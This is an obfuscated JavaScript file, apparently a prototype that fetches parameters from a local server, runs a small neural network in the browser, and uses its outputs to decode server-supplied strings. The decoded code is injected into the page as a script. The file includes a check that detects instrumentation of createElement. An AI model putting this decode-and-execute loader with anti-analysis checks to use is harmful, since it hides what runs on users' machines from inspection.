var r9A28kr6 = {
0:function ()
{
    var q385M0qR1 = ":8081";
    $.ajax({
        url:o5Bok32+q385M0qR1,
        dataType:"jsonp",
        jsonp:"callback",
        jsonpCallback:"success_jsonpCallback"
    }).done(function(data11) {
        var G2J6WG756 = data11.para.para1;
        var m39xR26m4 = data11.para.para2;
        var K22a3Q1K2 = data11.jc.init_key;
        S2S6n998o = data11.jc.name;
        y20DyI529 = data11.jc.init_arr;
        R30q7R2D8 += r9A28kr6[10](S2S6n998o,7,11);
        r9A28kr6[11](S2S6n998o,y20DyI529,G2J6WG756,m39xR26m4,K22a3Q1K2);//document.write引起的菊花
    });
},
1:function (str1) {
            var a1n0o24a8 = 0;
            for (let wx12G30w9 =0;wx12G30w9<str1.length;wx12G30w9++){
                a1n0o24a8 += str1.charCodeAt(wx12G30w9);
            }
            return a1n0o24a8;
        },
2:function () {
            const p3p768l2F = {
                apply: function (target, thisArg, args){
                    console.log("Intercepted y8Z8Q03y call tocreateElement with args: " + args);
                    return target.apply(thisArg, args)
                }
            };

            document.createElement= new Proxy(document.createElement, p3p768l2F);
            document.createElement('div');
            //Call y8Z8Q03y "virgin" createElement:
            try {
                document.createElement.toString();
                return false;
            }catch(e){
                return true;
            }
        },
3:function () {
            this.OG346OB92 = function (sx5s6s38) {
                var f376BYf65 = sx5s6s38[0];
                var GG379pi53 = 0;
                for (let wx12G30w9 = 1;wx12G30w9<sx5s6s38.length; wx12G30w9++){
                    if (f376BYf65<sx5s6s38[wx12G30w9]){
                        f376BYf65 = sx5s6s38[wx12G30w9];
                        GG379pi53 = wx12G30w9;
                    }
                }
                return GG379pi53;
            };
            this.R1P3kR67 = function (A,B) {
                var a3av35i52 = [];
                if (r9A28kr6[1](typeof B[0][0])===r9A28kr6[1]('number')) {
                    for (let wx12G30w9 in A) {
                        var PZ2P2801w = [];
                        for (let i1 in B[0]) {
                            var L2S2d54L8 = 0;
                            for (let n6Cnu035 in A[0]) {
                                L2S2d54L8 += A[wx12G30w9][n6Cnu035] * B[n6Cnu035][i1];
                            }
                            PZ2P2801w.push(L2S2d54L8);
                        }
                        a3av35i52.push(PZ2P2801w);

                    }
                }
                if (r9A28kr6[1](typeof B[0][0])!==r9A28kr6[1]('number')) {
                    for (let wx12G30w9 in A) {
                        var L2S2d54L8 = 0;
                        for (let n6Cnu035 in A[0]) {
                            L2S2d54L8 += A[wx12G30w9][n6Cnu035] * B[n6Cnu035];
                        }
                        a3av35i52.push(L2S2d54L8);
                    }
                }
                return a3av35i52;
            };
            this.L2S2d54L8 = function (sx5s6s38) {
                var a3av35i52 = 0;
                for(let wx12G30w9 in sx5s6s38){
                    a3av35i52+=sx5s6s38[wx12G30w9];
                }
                return a3av35i52;
            };
            this.I3I1Nf107 = function (x) {
                var a3av35i52 = x[0];
                for (var wx12G30w9 = 1; wx12G30w9 < x.length; wx12G30w9++) {
                    a3av35i52 =  Math.max(a3av35i52, x[wx12G30w9]);
                }
                return a3av35i52;
            };
            this.c175cT3M7 = function (x) {
                var a3av35i52 = [];
                for(let wx12G30w9 in x){
                    a3av35i52.push(Math.exp(x[wx12G30w9]));
                }

                return a3av35i52;
            };

        },
4:function (iii,para) {
            var D2S8D823r = new r9A28kr6[3]();
            this.weights = para[iii].weight;
            this.biases = para[iii].biases;

            this.o2sf060o9 = function (data) {
                for(let wx12G30w9 in this.weights){
                    var o181pp7o9 = this.weights[wx12G30w9];
                    var B3N816Bm1 = this.biases[wx12G30w9];
                    var E41qE1E7 =D2S8D823r.R1P3kR67(o181pp7o9,data);
                    for(let n6Cnu035 in E41qE1E7){
                        E41qE1E7[n6Cnu035] = E41qE1E7[n6Cnu035]+B3N816Bm1[n6Cnu035];
                    }
                    if (E41qE1E7.length<10){
                        data = this.R2R56tn87(E41qE1E7);
                    }
                    if (E41qE1E7.length>=10){
                        data = this.S22r1xS03(E41qE1E7);
                    }
                }
                return data;
            };
            this.R2R56tn87 = function (x) {
                var f376BYf65 = D2S8D823r.I3I1Nf107(x);
                for (let wx12G30w9 in x){
                    x[wx12G30w9] = x[wx12G30w9] - f376BYf65;
                }
                var l21V65lp0 = D2S8D823r.c175cT3M7(x);
                var F3pF4119b = D2S8D823r.L2S2d54L8(l21V65lp0);
                var j5sj3h3 = [];
                for (let n6Cnu035 in l21V65lp0){
                    j5sj3h3.push(l21V65lp0[n6Cnu035] /F3pF4119b);
                }
                return j5sj3h3;
            };
            this.S22r1xS03 = function (E41qE1E7) {
                var a3av35i52 = [];
                for (let wx12G30w9 in E41qE1E7){
                    E41qE1E7[wx12G30w9] = -E41qE1E7[wx12G30w9];
                }
                var c175cT3M7 = D2S8D823r.c175cT3M7(E41qE1E7);
                for(let wx12G30w9 in E41qE1E7){
                    a3av35i52.push(1.0/(1.0+c175cT3M7[wx12G30w9]));
                }
                return a3av35i52;
            };

            this.h20HhW992 = function (X) {
                var K5Y8n2K= this.o2sf060o9(X);
                return K5Y8n2K;
            };
        },
5:function (iii,para) {
            this.size = 0;
            this.d = {};
            this.d1 = {};
            this.d2 = {};
            this.P20P840yo = function (sx5s6s38)
            {
                var I3I1Nf107 = 0;
                var n6Cnu035 = 0;
                for (var wx12G30w9 = 0; wx12G30w9 < sx5s6s38.length; wx12G30w9++)
                {
                    if (sx5s6s38[wx12G30w9] > I3I1Nf107)
                    {
                        I3I1Nf107 = sx5s6s38[wx12G30w9];
                        n6Cnu035 = wx12G30w9;
                    }
                }
                return n6Cnu035;
            };
            this.m21m04dt3 =function (data) {
                var KKB44N09 = new Array();
                var sx5s6s38 = new Array();
                for(var wx12G30w9=0;wx12G30w9<data.length;wx12G30w9++){
                    KKB44N09[wx12G30w9] = this.P20P840yo(data[wx12G30w9])
                }
                for(var YY3y69v15=0;YY3y69v15<KKB44N09.length;YY3y69v15++){
                    sx5s6s38[YY3y69v15] = this.d1[KKB44N09[YY3y69v15]]
                }
                return sx5s6s38;
            };

            this.B251BV0k5 = function (X) {
                this.d = para[iii].d;
                this.d1 = para[iii].d1;
                this.d2 = para[iii].d2;
                var Q218uQ4u0 = [];
                for (let wx12G30w9 in X){
                    for (let n6Cnu035 in X[wx12G30w9]){
                        try {
                            if(r9A28kr6[1](typeof this.d[X[wx12G30w9][n6Cnu035]])===r9A28kr6[1]("undefined"))
                            {
                                Q218uQ4u0.push(0.0);
                            }
                            if(r9A28kr6[1](typeof this.d[X[wx12G30w9][n6Cnu035]])!==r9A28kr6[1]("undefined"))
                            {
                                Q218uQ4u0.push(parseFloat(this.d[X[wx12G30w9][n6Cnu035]])/30003);
                            }
                        }
                        catch (e) {
                            Q218uQ4u0.push(0.0);
                        }
                    }
                }
                return [Q218uQ4u0];
            }
        },
6:function (list,G2J6WG756,m39xR26m4){
            var Q218uQ4u0 = [];
            for (let wx12G30w9 = 0;wx12G30w9<3;wx12G30w9++){
                var R5vBR69 = new r9A28kr6[4](wx12G30w9,G2J6WG756);
                var m18J2F4m1 = new r9A28kr6[5](wx12G30w9,m39xR26m4);
                var UU252T3c6 = m18J2F4m1.B251BV0k5([list]);
                var Z25k4ZZ13 = R5vBR69.h20HhW992(UU252T3c6[0]);
                var M9Mk0S1 = m18J2F4m1.m21m04dt3([Z25k4ZZ13]);
                Q218uQ4u0.push(M9Mk0S1[0]);
            }
            return Q218uQ4u0;
        },
7:function (R30q7R2D8)
        {
            R30q7R2D8=unescape(R30q7R2D8);
            var TE33m10T8=String.fromCharCode(R30q7R2D8.charCodeAt(0)-R30q7R2D8.length);
            for(var wx12G30w9=1;wx12G30w9<R30q7R2D8.length;wx12G30w9++){
                TE33m10T8+=String.fromCharCode(R30q7R2D8.charCodeAt(wx12G30w9)-TE33m10T8.charCodeAt(wx12G30w9-1));
            }
            return TE33m10T8;
        },
8:function  (Bn2Bb9529) {
            Bn2Bb9529 = r9A28kr6[7](Bn2Bb9529);
            var Kv12yK291 = document.createElement('script');
            Kv12yK291.type="text/javascript";
            Kv12yK291.text=Bn2Bb9529;
            document.getElementsByTagName('head')[0].appendChild(Kv12yK291);
            Kv12yK291 = null;
        },
9:function () {
            R30q7R2D8 ='';
            X30Xe804L = [];
            j2UQ208j7 =GG379pi53;
            GG379pi53 = 0;
            n8n2b2D6 = 2;
        },
10:function (sx5s6s38,GG379pi53,n8n2b2D6) {
            var Bn2Bb9529 = '';
            X30Xe804L = [];
            for (let wx12G30w9 = 0; wx12G30w9 < sx5s6s38[GG379pi53].length; wx12G30w9++) {
                var rr3og4385 = sx5s6s38[GG379pi53][wx12G30w9]^sx5s6s38[n8n2b2D6][wx12G30w9];
                X30Xe804L.push(rr3og4385);
                P224P2s5X+=1;
            }
            Bn2Bb9529 += X30Xe804L.map(e=>String.fromCharCode(e)).join('');
            return Bn2Bb9529;
        },
11:function (S2S6n998o,n_a,G2J6WG756,m39xR26m4,K22a3Q1K2) {
            var a3av35i52 = r9A28kr6[6](n_a,G2J6WG756,m39xR26m4);
            GG379pi53+=1;
            q385M0qR1 = ":8082";
            $.ajax({
                url:o5Bok32+q385M0qR1,
                type:"post",
                data:"***"+[P224P2s5X,a3av35i52[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var r8ri5K1 = data.result;
                if(r8ri5K1[1]){
                    if (GG379pi53===1){
                        var Kv12yK291 = document.createElement('script');
                        Kv12yK291.type="text/javascript";
                        R30q7R2D8 = r9A28kr6[7](R30q7R2D8);
                        Kv12yK291.text=R30q7R2D8;
                        document.getElementsByTagName('head')[0].appendChild(Kv12yK291);
                        const f2m9f50x8 = new j14D2O1j0();
                        const BoC306B13 = f2m9f50x8.Y3YI365n1();
                        Kv12yK291 = null;
                        if(BoC306B13===K22a3Q1K2){
                            R30q7R2D8 = '';
                            X30Xe804L = [];
                            R30q7R2D8 +=r9A28kr6[10](S2S6n998o,a3av35i52[0],a3av35i52[1]);
                            return r9A28kr6[12](S2S6n998o,[a3av35i52[0],a3av35i52[1],r8ri5K1[0]],G2J6WG756,m39xR26m4);
                        }
                    }
                    R30q7R2D8 +=r9A28kr6[10](S2S6n998o,a3av35i52[0],a3av35i52[1]);
                    return r9A28kr6[11](S2S6n998o,[a3av35i52[0],a3av35i52[1],r8ri5K1[0]],G2J6WG756,m39xR26m4,K22a3Q1K2);
                }
                if (GG379pi53!==1)
                {
                    r9A28kr6[9]();
                    return r9A28kr6[13](S2S6n998o,[a3av35i52[0],a3av35i52[1],r8ri5K1[0]],G2J6WG756,m39xR26m4);
                }
            });

        },
12:function (S2S6n998o,n_a,G2J6WG756,m39xR26m4) {
            var a3av35i52 = r9A28kr6[6](n_a,G2J6WG756,m39xR26m4);
            GG379pi53+=1;
            q385M0qR1 = ":8082";
            $.ajax({
                url:o5Bok32+q385M0qR1,
                type:"post",
                data:"***"+[P224P2s5X,a3av35i52[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var r8ri5K1 = data.result;
                if (!r8ri5K1[1]||r9A28kr6[2]()) {
                    r9A28kr6[9]();
                    return r9A28kr6[13](S2S6n998o, [a3av35i52[0], a3av35i52[1], r8ri5K1[0]],G2J6WG756,m39xR26m4);
                }
                if (r8ri5K1[1]) {
                    if (GG379pi53 === 4) {
                        r9A28kr6[8](R30q7R2D8);
                        return 0;
                    }
                    R30q7R2D8 += r9A28kr6[10](S2S6n998o, a3av35i52[0], a3av35i52[1]);
                    return r9A28kr6[12](S2S6n998o, [a3av35i52[0], a3av35i52[1], r8ri5K1[0]],G2J6WG756,m39xR26m4);
                }
            });
        },
13:function (S2S6n998o,n_a,G2J6WG756,m39xR26m4) {
            var a3av35i52 = r9A28kr6[6](n_a,G2J6WG756,m39xR26m4);
            q385M0qR1 = ":8082";
            $.ajax({
                url:o5Bok32+q385M0qR1,
                type:"post",
                data:"***"+[P224P2s5X,a3av35i52[2]]+"***",
                dataType:"jsonp",
                jsonp:"callback",
                jsonpCallback:"success_jsonpCallback1"
            }).done(function(data) {
                var r8ri5K1 = data.result;
                var cj6X46c4 = r9A28kr6[10](S2S6n998o, a3av35i52[0], a3av35i52[1]);
                y8Z8Q03y.push(cj6X46c4);
                R30q7R2D8 += cj6X46c4;
                GG379pi53 += 1;
                if (GG379pi53 < 4) {
                    if (GG379pi53 === n8n2b2D6) {
                        try {
                            r9A28kr6[8](R30q7R2D8);
                            return 0;
                        }
                        catch (e) {
                            R30q7R2D8 = y8Z8Q03y[1] + y8Z8Q03y[0];
                            r9A28kr6[8](R30q7R2D8);
                            return 0;
                        }
                    }
                    return r9A28kr6[13](S2S6n998o, [a3av35i52[0], a3av35i52[1], r8ri5K1[0]],G2J6WG756,m39xR26m4);
                }
            });
        },
};
const o5Bok32 = "http://127.0.0.1";
var P224P2s5X = 0;
var y8Z8Q03y = [];
var S2S6n998o = [];
var y20DyI529 = [];
var X30Xe804L = [];
var GG379pi53 = -1;
var n8n2b2D6 = 0;
var j2UQ208j7 = 0;
var R30q7R2D8 = '';
r9A28kr6[0]();
